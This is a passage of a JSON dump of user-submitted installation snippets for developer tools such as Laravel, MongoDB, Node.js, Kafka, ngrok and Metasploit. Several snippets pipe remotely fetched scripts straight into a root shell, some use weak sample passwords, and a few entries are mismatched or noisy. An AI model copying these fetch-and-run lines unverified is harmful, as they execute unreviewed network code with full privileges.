  {
    "id": 2868,
    "keyword": null,
    "link": null,
    "title": " install jquery npm",
    "description": "Type this into terminal: > npm install jquery\n<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-latest.min.js\"></script>\nnpm install jquery\nTo install jquery using npm write same command >npm install jquery\n",
    "reg_date": "2021-10-11T22:08:14.000Z"
  },
  {
    "id": 2869,
    "keyword": null,
    "link": null,
    "title": " install jsdoc",
    "description": "npm install -g jsdoc # or npm install --save-dev jsdoc\n",
    "reg_date": "2021-10-11T22:08:14.000Z"
  },
  {
    "id": 2870,
    "keyword": null,
    "link": null,
    "title": " install jupyter notebook pypi",
    "description": "pip install jupyter\npip3 install jupyter\nconda install -c conda-forge notebook \n$ python -m pip install <package>  \nAbdisa\n",
    "reg_date": "2021-10-11T22:08:14.000Z"
  },
  {
    "id": 2871,
    "keyword": null,
    "link": null,
    "title": " install jupyter notebook ubuntu",
    "description": "pip install jupyter\npip3 install jupyter\nconda install -c conda-forge notebook \nconda install -c conda-forge jupyterlab \n",
    "reg_date": "2021-10-11T22:08:14.000Z"
  },
  {
    "id": 2872,
    "keyword": null,
    "link": null,
    "title": " install jupyter notebook ubuntu 20.04",
    "description": "# Jupyter notebook for ubuntu # you should have python python3 --version # this might me only \"python\" if yo use python2  # you should have pip pip3 --version # just \"pip\" if you use older version  # install jupyter notebook sudo -H pip3 install jupyter # use \"pip\" according to your need  # run jupyter notebook jupyter notebook\n",
    "reg_date": "2021-10-11T22:08:15.000Z"
  },
  {
    "id": 2873,
    "keyword": null,
    "link": null,
    "title": " install kafka ubuntu command line",
    "description": "sudo apt install default-jre sudo apt install zookeeperd sudo adduser --system --no-create-home --disabled-password --disabled-login kafka cd ~ wget \"http://www-eu.apache.org/dist/kafka/1.0.1/kafka_2.12-1.0.1.tgz\" #replace the url with the newest release if outdated sudo mkdir /opt/kafka sudo tar -xvzf kafka_2.12-1.0.1.tgz --directory /opt/kafka --strip-components 1 sudo mkdir /var/lib/kafka sudo mkdir /var/lib/kafka/data sudo chown -R kafka:nogroup /opt/kafka sudo chown -R kafka:nogroup /var/lib/kafka sudo systemctl restart kafka\n",
    "reg_date": "2021-10-11T22:08:15.000Z"
  },
  {
    "id": 2874,
    "keyword": null,
    "link": null,
    "title": " install kazam ubuntu 18.04",
    "description": "sudo add-apt-repository ppa:sylvain-pineau/kazam sudo apt-get update sudo apt-get install kazam kazam -v # to check the version of kazam\nsudo apt update sudo apt install kazam\n",
    "reg_date": "2021-10-11T22:08:15.000Z"
  },
  {
    "id": 2875,
    "keyword": null,
    "link": null,
    "title": " install kazam ubuntu 20.04",
    "description": "# Installing Kazam on Ubuntu 20.04 sudo apt install kazam\n",
    "reg_date": "2021-10-11T22:08:15.000Z"
  },
  {
    "id": 2876,
    "keyword": null,
    "link": null,
    "title": " install kubernetes on ubuntu",
    "description": "# Installing Kubectl curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl chmod +x ./kubectl sudo mv ./kubectl /usr/local/bin/kubectl kubectl version --client # Installing Minikube curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \\   && chmod +x minikube sudo mkdir -p /usr/local/bin/ sudo install minikube /usr/local/bin/ minikube start --driver=none  # If this fails with a message \"requires conntrack to be installed in root's path\" sudo apt install conntrack # then try again sudo minikube start --driver=none #check the status sudo minikube status # Output: #host: Running #kubelet: Running #apiserver: Running #kubeconfig: Configured  #It is suggested (by minikube) to change the ownership and #permissions of ~/.kube and ~/.minikube after the installation.  sudo chown -R $USER $HOME/.kube sudo chown -R $USER $HOME/.minikube  \nsudo apt-get update sudo apt-get install -y apt-transport-https ca-certificates curl \ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" curl -LO \"https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256\" echo \"$(<kubectl.sha256) kubectl\" | sha256sum --check sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl kubectl version --client\nsudo apt-add-repository \"deb http://apt.kubernetes.io/ kubernetes-xenial main\"\nsudo apt-mark hold kubeadm kubelet kubectl\nsudo systemctl start docker\n",
    "reg_date": "2021-10-11T22:08:15.000Z"
  },
  {
    "id": 2877,
    "keyword": null,
    "link": null,
    "title": " install laravel",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\nLaravel 8* install composer comand  composer create-project laravel/laravel .  php artisan serve\ncomposer global require \"laravel/installer\"\ncomposer global require laravel/installer  laravel new blog\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\nlaravel install on windows ----------------------------------- 1-composer install https://getcomposer.org/download/ 2-laravel install using composer composer global require laravel/installer 3-create new project laravel new blog cd blog  4-serve project to localhost php artisan serve \n",
    "reg_date": "2021-10-11T22:08:16.000Z"
  },
  {
    "id": 2878,
    "keyword": null,
    "link": null,
    "title": " install laravel on ubuntu 20.04",
    "description": "1. Install Prerequisites Install the software dependencies.  $ sudo apt install -y php-mbstring php-xml php-fpm php-zip php-common php-fpm php-cli unzip curl nginx Install Composer:  $ sudo curl -s https://getcomposer.org/installer | php $ sudo mv composer.phar /usr/local/bin/composer Verify the Composer installation.  $ composer diagnose Checking platform settings: OK Checking git settings: OK Checking http connectivity to packagist: OK Checking https connectivity to packagist: OK Checking github.com rate limit: OK Checking disk free space: OK Checking pubkeys: Tags Public Key Fingerprint: 57815BA2 7E54DC31 7ECC7CC5 573090D0  87719BA6 8F3BB723 4E5D42D0 84A14642 Dev Public Key Fingerprint: 4AC45767 E5EC2265 2F0C1167 CBBB8A2B  0C708369 153E328C AD90147D AFE50952 OK Checking composer version: OK Composer version: 1.10.10 PHP version: 7.4.3 PHP binary path: /usr/bin/php7.4 OpenSSL version: OpenSSL 1.1.1f  31 Mar 2020 Install MariaDB.  $ sudo apt install -y mariadb-client mariadb-server Start MariaDB.  $ sudo systemctl enable --now mariadb.service The root password is blank for a newly installed MariaDB server. Configure the MariaDB security by answering these questions appropriately for your server.  $ sudo mysql_secure_installation 2. Install Laravel Replace example with your project name where it appears throughout this guide.  Create a Laravel project with Composer. You may disregard the warning not to run Composer as root for this step. See the Composer documentation for details.  $ cd /var/www/html $ sudo composer global require laravel/installer $ sudo composer create-project --prefer-dist laravel/laravel example Grant your non-root user access.  $ sudo chmod -R 755 /var/www/html/example $ sudo chown -R example_user:example_user /var/www/html/example Install the example project.  $ cd example $ composer install Test the Laravel application manually in the /var/www/html/example folder. Replace the example IP address with your server's IP.  $ cd /var/www/html/example $ php artisan serve --host=192.0.2.123 --port=8000 To access this example:  http://192.0.2.123:8000 Type CTRL+C in your SSH session to stop the Laravel application.  3. Configure Nginx For public/production use, configure Nginx.  Set the file permissions. Replace example with your Laravel project name.  $ sudo chmod -R 755 /var/www/html/example $ sudo chown -R www-data:www-data /var/www/html/example Create an Nginx configuration file.  $ sudo nano /etc/nginx/sites-available/example Paste the following to your example configuration file.  Replace server_name example.com; with your domain or server IP address. You can also use an underscore as a wildcard, for example: server_name _; Replace /var/www/html/example/public with your project path. If you installed a different version of PHP, edit the /var/run/php/php7.4-fpm.sock value for your version. You can find your sock file in /var/run/php/.  server {     listen 80;     server_name example.com;     root /var/www/html/example/public;      add_header X-Frame-Options \"SAMEORIGIN\";     add_header X-XSS-Protection \"1; mode=block\";     add_header X-Content-Type-Options \"nosniff\";      index index.php;      charset utf-8;      location / {         try_files $uri $uri/ /index.php?$query_string;     }      location = /favicon.ico { access_log off; log_not_found off; }     location = /robots.txt  { access_log off; log_not_found off; }      error_page 404 /index.php;      location ~ \\.php$ {         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;         fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;         include fastcgi_params;     }      location ~ /\\.(?!well-known).* {         deny all;     } } Enable the Nginx configuration.  $ sudo ln -s /etc/nginx/sites-available/example /etc/nginx/sites-enabled/ Remove the default configuration file.  $ sudo rm /etc/nginx/sites-enabled/default Restart Nginx.  $ sudo systemctl restart nginx Test that your Laravel application loads properly in a web browser.  http://example.com/ 4. Configure MariaDB Log in to MariaDB as root.  # mysql -p -u root Create a database named laravelexample.  MariaDB [(none)]> CREATE DATABASE `laravelexample` CHARACTER SET utf8 COLLATE utf8_general_ci; Create a database user.  MariaDB [(none)]> CREATE USER 'laravelexampleuser'@'%' IDENTIFIED BY 'password'; Grant permissions.  MariaDB [(none)]> use laravelexample; MariaDB [laravelexample]> GRANT ALL ON `laravelexample.*` TO 'laravelexampleuser'@'%'; MariaDB [laravelexample]> FLUSH PRIVILEGES; MariaDB [laravelexample]> EXIT; Edit the Laravel application .env file.  $ sudo nano /var/www/html/example/.env Set the database connection variables.  DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravelexample DB_USERNAME=laravelexampleuser DB_PASSWORD=password Save and exit the file.\nssh root@IP_ADDRESS -p PORT_NUMBER apt-get update -y && apt-get upgrade -y apt-get install apache2 php7.4 libapache2-mod-php php-curl php-pear php-gd php-dev php-zip php-mbstring php-mysql php-xml curl -y systemctl start apache2 systemctl enable apache2  curl -sS https://getcomposer.org/installer | php mv composer.phar /usr/local/bin/composer chmod +x /usr/local/bin/composer  cd /var/www/html composer create-project laravel/laravel laravelapp --prefer-dist  cd laravelapp php artisan  chown -R www-data:www-data /var/www/html/laravelapp chmod -R 775 /var/www/html/laravelapp/storage  # add the following text to /etc/apache2/sites-available/laravel.conf <VirtualHost *:80> ServerName laravel.example.com ServerAdmin admin@example.com DocumentRoot /var/www/html/laravelapp/public <Directory /var/www/html/laravelapp> AllowOverride All </Directory> ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined </VirtualHost>  # then, run  a2ensite laravel.conf a2enmod rewrite  systemctl restart apache2  # now, open http://laravel.example.com!\n",
    "reg_date": "2021-10-11T22:08:16.000Z"
  },
  {
    "id": 2879,
    "keyword": null,
    "link": null,
    "title": " install laravel specific version using composer",
    "description": "composer create-project laravel/laravel=\"5.1.*\" appName\ncomposer create-project --prefer-dist laravel/laravel blog \"6.*\"\ncomposer create-project laravel/laravel=4.1.27 your-project-name --prefer-dist\n",
    "reg_date": "2021-10-11T22:08:16.000Z"
  },
  {
    "id": 2880,
    "keyword": null,
    "link": null,
    "title": " install laravel ui in laravel 8",
    "description": "1 ) FollowUpQuestionsAfterSurgeryController 2 ) composer require laravel/ui 3 ) php artisan ui vue --auth 4 ) npm install 5 ) npm run dev  6 ) go to example.com/login\n",
    "reg_date": "2021-10-11T22:08:16.000Z"
  },
  {
    "id": 2881,
    "keyword": null,
    "link": null,
    "title": " install latest nodejs stable linux",
    "description": "sudo apt install nodejs\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install nodejs npm install -g npm@latest\n# It's a good idea to use NVM (Node Version Manager) if you want to install # Node.js on Linux because it allows you to install many versions of Node # simultaneously and switch between them easily  # Navigate to desktop to avoid problems with permissions cd ~/Desktop  # Download the nvm script, but please note that new versions of nvm are # released as the time pass, so you should always check the following link: # https://github.com/nvm-sh/nvm#installing-and-updating # to get updated info sudo apt install curl && curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash  # You need to check whether nvm has been added to the PATH or not # So you should execute the command nvm --version  # IF IT HASN'T BEEN ADDED TO THE PATH, THEN MAKE SURE TO EXECUTE THESE COMMANDS: export NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\" [ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"  # To install the latest version of node, use the command: nvm install node  # You don't need to worry about npm installation as nvm automatically  # installs it alongside node  # Please visit nvm github repo for more info: https://github.com/nvm-sh/nvm\n",
    "reg_date": "2021-10-11T22:08:16.000Z"
  },
  {
    "id": 2882,
    "keyword": null,
    "link": null,
    "title": " install lighttpd",
    "description": "apt-get update  apt-get upgrade  apt-get install lighttpd  systemctl enable lighttpd systemctl start lighttpd  systemctl status lighttpd\n",
    "reg_date": "2021-10-11T22:08:16.000Z"
  },
  {
    "id": 2883,
    "keyword": null,
    "link": null,
    "title": " install linuxbrew",
    "description": "$ sh -c \"$(curl -fsSL https://raw.githubusercontent.com/Linuxbrew/install/master/install.sh)\" \n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\" \n",
    "reg_date": "2021-10-11T22:08:17.000Z"
  },
  {
    "id": 2884,
    "keyword": null,
    "link": null,
    "title": " install lutris kali linux",
    "description": "# For Debian echo \"deb http://download.opensuse.org/repositories/home:/strycore/Debian_10/ ./\" | sudo tee /etc/apt/sources.list.d/lutris.list wget -q https://download.opensuse.org/repositories/home:/strycore/Debian_10/Release.key -O- | sudo apt-key add -  # For Ubuntu, Elementary & POP_OS sudo add-apt-repository ppa:lutris-team/lutris  sudo apt-get update sudo apt-get install lutris\n",
    "reg_date": "2021-10-11T22:08:17.000Z"
  },
  {
    "id": 2885,
    "keyword": null,
    "link": null,
    "title": " install magento 2 command line composer",
    "description": "composer create-project --repository-url=https://repo.magento.com/ magento/project-community-edition .\n",
    "reg_date": "2021-10-11T22:08:17.000Z"
  },
  {
    "id": 2886,
    "keyword": null,
    "link": null,
    "title": " install magento 2 using composer",
    "description": "1  composer create-project --repository-url=https://repo.magento.com/ magento/project-community-edition <install-directory-name> \ncomposer create-project --repository-url=https://repo.magento.com/ magento/project-community-edition .\nphp bin/magento setup:install --base-url=\"http://magento2.local/\" --db-host=\"localhost\" --db-name=\"magento\" --db-user=\"magento\" --db-password=\"mage3nt0\" --admin-firstname=\"admin\" --admin-lastname=\"admin\" --admin-email=\"user@example.com\" --admin-user=\"admin\" --admin-password=\"admin123\" --language=\"en_US\" --currency=\"USD\" --timezone=\"America/Chicago\"  --use-rewrites=\"1\"  --backend-frontname=\"admin\"\n",
    "reg_date": "2021-10-11T22:08:17.000Z"
  },
  {
    "id": 2887,
    "keyword": null,
    "link": null,
    "title": " install mailhog mac",
    "description": "brew update && brew install mailhog\n",
    "reg_date": "2021-10-11T22:08:17.000Z"
  },
  {
    "id": 2888,
    "keyword": null,
    "link": null,
    "title": " install mariadb",
    "description": "sudo apt update sudo apt-get -y install mariadb-server sudo mysql_secure_installation sudo systemctl start mariadb sudo systemctl enable mariadb\nsudo apt update sudo apt-get -y install mariadb-server sudo systemctl start mariadb sudo systemctl enable mariadb\nsudo add-apt-repository \"deb [arch=amd64,arm64,ppc64el] http://mariadb.mirror.liquidtelecom.com/repo/10.4/ubuntu $(lsb_release -cs) main\"\n",
    "reg_date": "2021-10-11T22:08:18.000Z"
  },
  {
    "id": 2889,
    "keyword": null,
    "link": null,
    "title": " install material-ui",
    "description": "// usando npm npm install @material-ui/core  // usando yarn yarn add @material-ui/core\nnpm install @material-ui/core  # Yarn yarn add @material-ui/core\n// npm npm install @material-ui/core  // yarn yarn add @material-ui/core\n// using npm npm install @material-ui/core  // using yarn yarn add @material-ui/core\n// usando npm npm install @material-ui/icons  // usando yarn yarn add @material-ui/icons\n// with npmnpm install @material-ui/core // with yarnyarn add @material-ui/core\n",
    "reg_date": "2021-10-11T22:08:18.000Z"
  },
  {
    "id": 2890,
    "keyword": null,
    "link": null,
    "title": " install material ui",
    "description": "// usando npm npm install @material-ui/core  // usando yarn yarn add @material-ui/core\nnpm install @material-ui/core  # Yarn yarn add @material-ui/core\n// using npm npm install @material-ui/core  // using yarn yarn add @material-ui/core\n// usando npm npm install @material-ui/icons  // usando yarn yarn add @material-ui/icons\n$ npm install @material-ui/core\nmaterial ui\n",
    "reg_date": "2021-10-11T22:08:18.000Z"
  },
  {
    "id": 2891,
    "keyword": null,
    "link": null,
    "title": " install material ui icons",
    "description": "npm install @material-ui/icons\n// with npm npm install @material-ui/core  // with yarn yarn add @material-ui/core\n// with npm npm install @material-ui/icons  // with yarn yarn add @material-ui/icons\n// with npm npm install @material-ui/icons  // with yarn yarn add @material-ui/icons\nyarn add @material-ui/icons  # NPM npm install @material-ui/icons\n// with npmnpm install @material-ui/core // with yarnyarn add @material-ui/core\n",
    "reg_date": "2021-10-11T22:08:18.000Z"
  },
  {
    "id": 2892,
    "keyword": null,
    "link": null,
    "title": " install material ui lab",
    "description": "yarn add @material-ui/lab \nyarn add @material-ui/lab\nyarn add @material-ui/core\n",
    "reg_date": "2021-10-11T22:08:18.000Z"
  },
  {
    "id": 2893,
    "keyword": null,
    "link": null,
    "title": " install maven homebrew",
    "description": "brew install maven\n",
    "reg_date": "2021-10-11T22:08:19.000Z"
  },
  {
    "id": 2894,
    "keyword": null,
    "link": null,
    "title": " install maven in ubuntu",
    "description": "sudo apt-get update && sudo apt-get upgrade sudo apt-get install maven\n",
    "reg_date": "2021-10-11T22:08:19.000Z"
  },
  {
    "id": 2895,
    "keyword": null,
    "link": null,
    "title": " install mdx for nextjs",
    "description": "npm install --save @next/mdx @mdx-js/loader \n",
    "reg_date": "2021-10-11T22:08:19.000Z"
  },
  {
    "id": 2896,
    "keyword": null,
    "link": null,
    "title": " install metasploitable on ubuntu",
    "description": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall chmod 755 msfinstall ./msfinstall \ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb  msfinstall chmod 755 msfinstall ./msfinstall\n",
    "reg_date": "2021-10-11T22:08:19.000Z"
  },
  {
    "id": 2897,
    "keyword": null,
    "link": null,
    "title": " install minecraft server on ubuntu",
    "description": "Step 1: Install the required packages:  sudo apt update sudo apt install openjdk-8-jre-headless sudo apt install screen sudo ufw allow 25565  Step 2: Download the latest version of Mindcraft:  wget https://launcher.mojang.com/v1/objects/bb2b6b1aefcd70dfd1892149ac3a215f6c636b07/server.jar  Step 3: Configure and run the Mindcraft server:  screen java -Xms1024M -Xmx1024M -jar minecraft_server_1.15.2.jar nogui    Step 4: Configure the Server:  nano server.properties  Step 5: Enjoy :) \n",
    "reg_date": "2021-10-11T22:08:19.000Z"
  },
  {
    "id": 2898,
    "keyword": null,
    "link": null,
    "title": " install module to current directory pip",
    "description": "pip install <package-name> -t .\n",
    "reg_date": "2021-10-11T22:08:19.000Z"
  },
  {
    "id": 2899,
    "keyword": null,
    "link": null,
    "title": " install mongo ubuntu 20.04",
    "description": "sudo systemctl restart mongod\nsudo systemctl enable mongod\nsudo systemctl status mongod\nsudo systemctl start mongod\nsudo systemctl stop mongod\nmongo\n",
    "reg_date": "2021-10-11T22:08:20.000Z"
  },
  {
    "id": 2900,
    "keyword": null,
    "link": null,
    "title": " install mongodb in mac",
    "description": "// updated 2021 $ brew tap mongodb/brew $ brew install mongodb-community@4.4\n// setup  brew tap mongodb/brew  brew tap | grep mongodb  brew install mongodb-community@4.4  // after setup run below command for start brew services start mongodb-community@4.2  => after that your service had start, u can start the service now  \n//Starts Mongdb server @ mongodb://127.0.0.1:27017/ brew services start mongodb-community@4.2  //Stops Mongdb server @ mongodb://127.0.0.1:27017/ brew services stop mongodb-community@4.2  //mongo mongo - starts the mongo client   \nbrew services start mongodb-community@4.2 #Step 3 to run as a service\nbrew tap mongodb/brew #step 1\nbrew install mongodb-community@4.2 #Step 2\n",
    "reg_date": "2021-10-11T22:08:20.000Z"
  },
  {
    "id": 2901,
    "keyword": null,
    "link": null,
    "title": " install mongodb mac",
    "description": "// updated 2021 $ brew tap mongodb/brew $ brew install mongodb-community@4.4\n// setup  brew tap mongodb/brew  brew tap | grep mongodb  brew install mongodb-community@4.4  // after setup run below command for start brew services start mongodb-community@4.2  => after that your service had start, u can start the service now  \n//Starts Mongdb server @ mongodb://127.0.0.1:27017/ brew services start mongodb-community@4.2  //Stops Mongdb server @ mongodb://127.0.0.1:27017/ brew services stop mongodb-community@4.2  //mongo mongo - starts the mongo client   \nInstall brew using the -- /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\\ brew tap mongodb/brew brew install mongodb-community@5.0\nbrew tap mongodb/brew \nbrew services start mongodb-community@4.4 \n",
    "reg_date": "2021-10-11T22:08:20.000Z"
  },
  {
    "id": 2902,
    "keyword": null,
    "link": null,
    "title": " install mongodb on manjaro linux",
    "description": "pamac install mongodb-bin sudo systemctl enable --now mongodb sudo systemctl status mongodb\nsudo apt install -y mongodb # it will install mongodb server into linux system \n",
    "reg_date": "2021-10-11T22:08:20.000Z"
  },
  {
    "id": 2903,
    "keyword": null,
    "link": null,
    "title": " install mongodb ubuntu 20.04",
    "description": "sudo apt update sudo apt install -y mongodb //checking service and db sudo systemctl status mongodb or service mongodb status //start service sudo systemctl start mongod or service mongodb start //stop service sudo systemctl stop mongod  or service mongodb stop \nsudo systemctl restart mongod\nwget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add - echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/4.4 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list sudo apt-get update sudo apt-get install -y mongodb-org\nsudo apt update # Import the public key used by the package management system # The operation should respond with an OK. wget -qO - https://www.mongodb.org/static/pgp/server-4.2.asc | sudo apt-key add - # Create a list file for MOngoDB echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.2 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.2.list # Reload localpackage database sudo apt update #Install MongoDB packages sudo apt install -y mongodb-org\nsudo systemctl enable mongod\nfollow the steps from the below link  https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/\n",
    "reg_date": "2021-10-11T22:08:20.000Z"
  },
  {
    "id": 2904,
    "keyword": null,
    "link": null,
    "title": " install nano",
    "description": "sudo apt-get -y install nano\nsudo apt install nano\n",
    "reg_date": "2021-10-11T22:08:20.000Z"
  },
  {
    "id": 2905,
    "keyword": null,
    "link": null,
    "title": " install nano ubuntu",
    "description": "sudo apt-get -y install nano\nsudo apt install nano\n",
    "reg_date": "2021-10-11T22:08:21.000Z"
  },
  {
    "id": 2906,
    "keyword": null,
    "link": null,
    "title": " install nasm ubuntu",
    "description": "sudo apt-get install -y nasm\n",
    "reg_date": "2021-10-11T22:08:21.000Z"
  },
  {
    "id": 2907,
    "keyword": null,
    "link": null,
    "title": " install neofetch ubuntu",
    "description": "sudo apt install neofetch\n",
    "reg_date": "2021-10-11T22:08:21.000Z"
  },
  {
    "id": 2908,
    "keyword": null,
    "link": null,
    "title": " install neovim 0.5 ubuntu",
    "description": "sudo add-apt-repository ppa:neovim-ppa/unstable sudo apt-get update sudo apt-get install neovim \n",
    "reg_date": "2021-10-11T22:08:21.000Z"
  },
  {
    "id": 2909,
    "keyword": null,
    "link": null,
    "title": " install netbeans 8.2 ubuntu 20.04",
    "description": "Apache NetBeans IDE requires Java 8 or later Java Development Kit installed on your system. To install Java on your system, execute following command  sudo apt install default-jdk  We use snap package to install Netbeans IDE on Ubuntu Linux system. The latest Ubuntu system have default Snapd installed for application installation. Open a terminal on your system and run the following command to install Netbeans IDE  sudo snap install netbeans --classic  \nsudo apt install default-jdk sudo snap install netbeans --classic  #for remove netbeans sudo snap remove netbeans\nsudo snap install netbeans \n",
    "reg_date": "2021-10-11T22:08:21.000Z"
  },
  {
    "id": 2910,
    "keyword": null,
    "link": null,
    "title": " install netlify cli",
    "description": "npm install netlify-cli -g \n",
    "reg_date": "2021-10-11T22:08:22.000Z"
  },
  {
    "id": 2911,
    "keyword": null,
    "link": null,
    "title": " install netstat linux",
    "description": "# apt install net-tools     [On Debian/Ubuntu]\n# yum install net-tools     [On CentOS/RHEL] # apt install net-tools     [On Debian/Ubuntu] # zypper install net-tools  [On OpenSuse] # pacman -S netstat-nat     [On Arch Linux] \n",
    "reg_date": "2021-10-11T22:08:22.000Z"
  },
  {
    "id": 2912,
    "keyword": null,
    "link": null,
    "title": " install netstat linux centos 7",
    "description": "# apt install net-tools     [On Debian/Ubuntu]\n# yum install net-tools     [On CentOS/RHEL] # apt install net-tools     [On Debian/Ubuntu] # zypper install net-tools  [On OpenSuse] # pacman -S netstat-nat     [On Arch Linux] \n",
    "reg_date": "2021-10-11T22:08:22.000Z"
  },
  {
    "id": 2913,
    "keyword": null,
    "link": null,
    "title": " install networkx python",
    "description": "pip install networkx\n",
    "reg_date": "2021-10-11T22:08:22.000Z"
  },
  {
    "id": 2914,
    "keyword": null,
    "link": null,
    "title": " install next auth",
    "description": "npm i --save next-auth\nimport NextAuth from \"next-auth\" import Providers from \"next-auth/providers\"  export default NextAuth({   providers: [     // OAuth authentication providers     Providers.Apple({       clientId: process.env.APPLE_ID,       clientSecret: process.env.APPLE_SECRET,     }),     Providers.Google({       clientId: process.env.GOOGLE_ID,       clientSecret: process.env.GOOGLE_SECRET,     }),     // Sign in with passwordless email link     Providers.Email({       server: process.env.MAIL_SERVER,       from: \"<no-reply@example.com>\",     }),   ],   // SQL or MongoDB database (or leave empty)   database: process.env.DATABASE_URL, })\n",
    "reg_date": "2021-10-11T22:08:22.000Z"
  },
  {
    "id": 2915,
    "keyword": null,
    "link": null,
    "title": " install nginx",
    "description": "sudo apt-get update sudo apt-get -y install nginx\nsudo apt update sudo apt install nginx\napt install nginx \nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-11T22:08:22.000Z"
  },
  {
    "id": 2916,
    "keyword": null,
    "link": null,
    "title": " install nginx ubuntu 20.04",
    "description": "sudo apt update sudo apt install nginx\nsystemctl status nginx \nsudo apt update sudo apt install nginx \napt install -y nginx\n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2917,
    "keyword": null,
    "link": null,
    "title": " install ngrok",
    "description": "brew cask install ngrok\nnpm i -g ngrok \nsudo apt-get update sudo apt-get -y install nginx\nStart tunnel with any port ./ngrok http http://localhost:9999  Example: http://1ffcb38dcb8b.ngrok.io/paragonasia/  BAD: http://1ffcb38dcb8b.ngrok.io/paragonasia  Start tunnel with prt 80 ./ngrok http 80 \nngrok http -host-header=\"localhost:[port]\" [port] \n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2918,
    "keyword": null,
    "link": null,
    "title": " install ngrok ubuntu 20.04",
    "description": "sudo apt update sudo apt install snapd sudo snap install ngrok\n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2919,
    "keyword": null,
    "link": null,
    "title": " install ngrx/effects",
    "description": "ng add @ngrx/effects@latest\n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2920,
    "keyword": null,
    "link": null,
    "title": " install nmap ubuntu",
    "description": "sudo apt-get install nmap\nsudo apt install nmap\n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2921,
    "keyword": null,
    "link": null,
    "title": " install node 12 linux",
    "description": "sudo apt -y install curl dirmngr apt-transport-https lsb-release ca-certificates curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt -y install nodejs\n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2922,
    "keyword": null,
    "link": null,
    "title": " install node brew",
    "description": "brew install node\nbrew update #As a safe measure you should run brew doctor to make sure your system is ready to brew. Run the command below and follow any recommendations from brew doctor.  brew doctor #Next, add Homebrew&rsquo;s location to your $PATH in your .bash_profile or .zshrc file.  echo 'export PATH=\"/usr/local/opt/icu4c/sbin:$PATH\"' >> ~/.profile echo 'export PATH=\"/usr/local/opt/icu4c/bin:$PATH\"' >> ~/.profile #Next, install Node (npm will be installed with Node):  brew install node node -v\n$ /usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:08:23.000Z"
  },
  {
    "id": 2923,
    "keyword": null,
    "link": null,
    "title": " install node js ubuntu",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt install curl curl -sL https://deb.nodesource.com/setup_14.x | sudo bash - sudo apt install -y nodejs\nsudo apt update sudo apt install nodejs sudo apt install npm\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\n",
    "reg_date": "2021-10-11T22:08:24.000Z"
  },
  {
    "id": 2924,
    "keyword": null,
    "link": null,
    "title": " install node mac",
